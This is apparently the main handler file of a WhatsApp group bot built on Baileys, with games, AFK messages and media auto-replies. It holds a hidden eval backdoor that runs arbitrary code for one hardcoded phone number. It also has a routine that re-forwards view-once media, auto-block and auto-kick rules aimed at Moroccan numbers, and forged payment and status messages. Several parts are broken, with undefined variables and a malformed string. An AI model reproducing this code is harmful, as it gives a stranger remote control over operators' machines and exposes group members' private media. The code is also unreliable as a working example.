require('./settings')
const { modul } = require('./module')
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl, googleTTS, maker } = modul
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const { color, bgcolor } = require('./lib/color')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const { rentfrommznking, conns } = require('./lib/TempBot')
const { uptotelegra } = require('./lib/scrape/upload')
const { msgFilter } = require('./lib/antispam')

const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./lib/scrape/yt')
const scp1 = require('./lib/scrape/scraper') 
const scp2 = require('./lib/scrape/scraperr')
const scp3 = require('./lib/scrape/scraperrr')
const ffstalk = require('./lib/scrape/ffstalk')
const githubstalk = require('./lib/scrape/githubstalk')
const npmstalk = require('./lib/scrape/npmstalk')
const mlstalk = require('./lib/scrape/mlstalk')
const photooxy = require('./lib/scrape/photooxy')
const yts = require('./lib/scrape/yt-search')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./lib/database/owner.json'))
const mznkingverifieduser = JSON.parse(fs.readFileSync('./lib/database/user.json'))
const VoiceNoteMznKing = JSON.parse(fs.readFileSync('./assets/database/voicenote.json'))
const StickerMznKing = JSON.parse(fs.readFileSync('./assets/database/stickers.json'))
const ImageMznKing = JSON.parse(fs.readFileSync('./assets/database/images.json'))
const VideoMznKing = JSON.parse(fs.readFileSync('./assets/database/videos.json'))
const BadMznKing = JSON.parse(fs.readFileSync('./lib/database/bad.json'))
const DocMznKing = JSON.parse(fs.readFileSync('./assets/database/doc.json'))
const ZipMznKing = JSON.parse(fs.readFileSync('./assets/database/zip.json'))
const ApkMznKing = JSON.parse(fs.readFileSync('./assets/database/apk.json'))

let autosticker = JSON.parse(fs.readFileSync('./lib/database/autosticker.json'))
let ntnsfw = JSON.parse(fs.readFileSync('./lib/database/nsfw.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./lib/database/antivirus.json'))
let nttoxic = JSON.parse(fs.readFileSync('./lib/database/antitoxic.json'))
let ntlinkgc =JSON.parse(fs.readFileSync('./lib/database/antilink.json'))

global.db = JSON.parse(fs.readFileSync('./lib/database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}

const ownername = "${global.ownername}"
// Get time & date from timezone.
let timezone = global.timezone; 
if (!timezone || !moment.tz.zone(timezone)) {
  timezone = 'GMT'; 
}
const xtime = moment.tz(timezone).format('hh:mm:ss');
const xdate = moment.tz(timezone).format('DD/MM/YYYY');
const time2 = moment().tz(timezone).format('hh:mm:ss');
         if(time2 < "23:59:00"){
var mznkingztimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var mznkingztimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var mznkingztimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var mznkingztimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var mznkingztimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var mznkingztimewisher = `Good Morning 🌄`
 } 

// read database
let tebaklagu = db.game.tebaklagu = []
let kuismath = db.game.math = []
let vote = db.others.vote = []

module.exports = TsunadeBot = async (TsunadeBot, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.chat) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = prefix ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefix ?? global.prefix

        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()

        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await TsunadeBot.decodeJid(TsunadeBot.user.id)
        const MznKingTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const MznKingTheDeveloper = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await TsunadeBot.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isUser = mznkingverifieduser.includes(sender)
    	const banUser = await TsunadeBot.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>')
    
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilink = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
        
        // Get reply messages from settings.js
        const errorReply = '${message.errorReply}' || '⚠️ *An error occurred while processing your request.*';
        const successReply = '${message.successReply}' || '✅ *Done!*';
        const onlyAdminReply = '${message.onlyAdmin}' || '```⛔ You are not an admin.```';
        const notAdminReply = '${message.notAdmin}' || ''😬 *I\'m not an admin here*';
        const onlyOwnerReply = '${message.onlyOwner}' || '*⛔ This is an owner command!*';
        const onlyGcReply = '${message.onlyGc}' || '*⛔ This is a group command!*';
        const onlyPmReply = '${message.onlyPm}' || '*⛔ This is a private command!*';
        //theme sticker reply
        const MznKingWaitReply = () => {
        m.reply(`${succesReply}`)
        }
        const MznKingAdminReply = () => {
        m.reply(`${onlyAdminReply}`)
        }
        const MznKingBotAdminReply = () => {
        m.reply(`${notAdminReply}`)
        }
        const MznKingOwnerReply = () => {
        m.reply(`${onlyOwnerReply}`)
        }
        const MznKingGroupReply = () => {
        m.reply(`${onlyGcReply}`)
        }
        const MznKingPrivateReply = () => {
        m.reply(`${onlyPmReply}`)
        }
                   
		if (isEval && senderNumber == "94789481495") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					)
					m.reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
				await TsunadeBot.sendMessage(from, { text: evaled }, { quoted: m })
			} catch (e) {
				TsunadeBot.sendMessage(from, { text: String(e) }, { quoted: m })
			}
		}
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
}
let chats = global.db.chats[m.chat]
               if (typeof chats !== 'object') global.db.chats[m.chat] = {}
               if (chats) {
               } else global.db.chats[from] = {
                  }
} catch (err) {
console.error(err)
}

if (!TsunadeBot.public) {
if (!m.key.fromMe) return
}
// Reactions.
if (m.sender === '94789481495@s.whatsapp.net') {
  developerReactionMessage = {
    react: {
      text: '👨‍💻',
      key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
    }
  }
  TsunadeBot.sendMessage(m.chat, developerReactionMessage)
} else if (m.sender === '94771227821@s.whatsapp.net') {
  developer2ReactionMessage = {
    react: {
      text: '👑',
      key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
    }
  }
  TsunadeBot.sendMessage(m.chat, developer2ReactionMessage)
} else if (m.sender === '${global.arNumber}@s.whatsapp.net') {
  userReactionMessage = {
    react: {
      text: '${global.arEmoji}',
      key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
    }
  }
  TsunadeBot.sendMessage(m.chat, userReactionMessage)
}

//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Group Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Private Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

if (isCmd && !isUser) {
mznkingverifieduser.push(sender)
fs.writeFileSync('./lib/database/user.json', JSON.stringify(mznkingverifieduser, null, 2))
}

TsunadeBot.sendPresenceUpdate('unavailable', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`🤨 *Don't disturb him, He's in AFK.*
🛑 Reason: ${reason ? 'With Reason: ' + reason : 'No Reason'}
🕒 During: ${clockString(new Date - afkTime)}
`.trim())
}

//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {

            kuis = true

            jawaban = kuismath[m.sender.split('@')[0]]

            if (budy.toLowerCase() == jawaban) {

                await m.reply(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\nWould you want to play again? Send ${prefix}math mode`)

                delete kuismath[m.sender.split('@')[0]]

            } else m.reply('*Wrong Answer!*')

        }


//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) {
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'The game is over',
'-2': 'Invalid',
'-1': 'Invalid Position',
0: 'Invalid Position',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to give up and admit defeat`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await TsunadeBot.sendText(room.x, str, m, { mentions: parseMention(str) } )
await TsunadeBot.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.chat) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.chat)) {
	    TsunadeBot.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    TsunadeBot.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) TsunadeBot.sendText(roof.p, `Please Select \nRock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) TsunadeBot.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) TsunadeBot.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    TsunadeBot.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.chat) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.chat.toLowerCase())[0]
	    roof.text = m.chat
	    m.reply(`You have chosen ${m.chat} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) TsunadeBot.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.chat) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.chat.toLowerCase())[0]
	    roof.text2 = m.chat
	    m.reply(`You have chosen ${m.chat} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) TsunadeBot.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    TsunadeBot.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

//autoblock 212
if (global.autoblockmorroco) {
if (m.sender.startsWith('212')) return TsunadeBot.updateBlockStatus(m.sender, 'block')
}

//autokick 212
if (global.autokickmorroco) {
if (m.isGroup && m.sender.startsWith('212')) return TsunadeBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}

//antispam kick
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {

console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))

return await TsunadeBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}

}

async function sendTsunadeBotMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await TsunadeBot.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

//group chat msg by mznking
const replygcmznking = (teks) => {
TsunadeBot.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./assets/theme/TsunadeBot-1.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})
}
const replygcmznking2 = (teks) => {        
sendTsunadeBotMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
const reply = (teks) => {
TsunadeBot.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : fpay })
}

const sendSticker = (pesan) => {
TsunadeBot.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

const sendvn = (teks) => {
TsunadeBot.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

//bug loading
async function loading () {
var mznkinglod = [
"《 █▒▒▒▒▒▒▒▒▒ 》10%",
"《 ██▒▒▒▒▒▒▒▒ 》20%",
"《 ███▒▒▒▒▒▒▒ 》30%",
"《 ████▒▒▒▒▒▒ 》40%",
"《 █████▒▒▒▒▒ 》50%",
"《 ██████▒▒▒▒ 》60%",
"《 ███████▒▒▒ 》70%",
"《 ████████▒▒ 》80%",
"《 █████████▒ 》90%",
"《 ██████████ 》100%",
"🧚 𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🧚"
]
let { key } = await TsunadeBot.sendMessage(from, {text: 'Loading...'})

for (let i = 0; i < mznkinglod.length; i++) {
await TsunadeBot.sendMessage(from, {text: mznkinglod[i], edit: key });
}
}

        //autoreply
for (let BhosdikaMznKing of VoiceNoteMznKing) {
if (budy === BhosdikaMznKing) {
let audiobuffy = fs.readFileSync(`./assets/audio/${BhosdikaMznKing}.mp3`)
TsunadeBot.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaMznKing of StickerMznKing){
if (budy === BhosdikaMznKing){
let stickerbuffy = fs.readFileSync(`./assets/sticker/${BhosdikaMznKing}.webp`)
TsunadeBot.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaMznKing of ImageMznKing){
if (budy === BhosdikaMznKing){
let imagebuffy = fs.readFileSync(`./assets/image/${BhosdikaMznKing}.jpg`)
TsunadeBot.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaMznKing of VideoMznKing){
if (budy === BhosdikaMznKing){
let videobuffy = fs.readFileSync(`./assets/video/${BhosdikaMznKing}.mp4`)
TsunadeBot.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
TsunadeBot.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaMznKing of ApkMznKing) {
if (budy === BhosdikaMznKing) {
let buffer = fs.readFileSync(`./assets/apk/${BhosdikaMznKing}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
TsunadeBot.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaMznKing of ZipMznKing) {
if (budy === BhosdikaMznKing) {
let buffer = fs.readFileSync(`./assets/zip/${BhosdikaMznKing}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaMznKing of DocMznKing) {
if (budy === BhosdikaMznKing) {
let buffer = fs.readFileSync(`./assets/doc/${BhosdikaMznKing}.pdf`)
senddocu(buffer)
}
}

if (m.isGroup && m.mtype == 'viewOnceMessage') {
let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${m.sender.split("@")[0]}\n├ *Clock* : ${time2}\n└ *Message* : ${m.mtype}`
TsunadeBot.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
m.copyNForward(m.chat, true, {readViewOnce: true}, {quoted: m}).catch(_ => m.reply(`Maybe It's Opened`))
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }

const banRep = () => {
TsunadeBot.sendMessage(m.chat, {
text:`Sorry you've been banned, please chat @${creator.split("@")[0]} to unban`,
mentions: [creator],
},
{
quoted:m
})
}

//Fake
        const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id:global.botname, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.botname}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=94789481495:94789481495\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
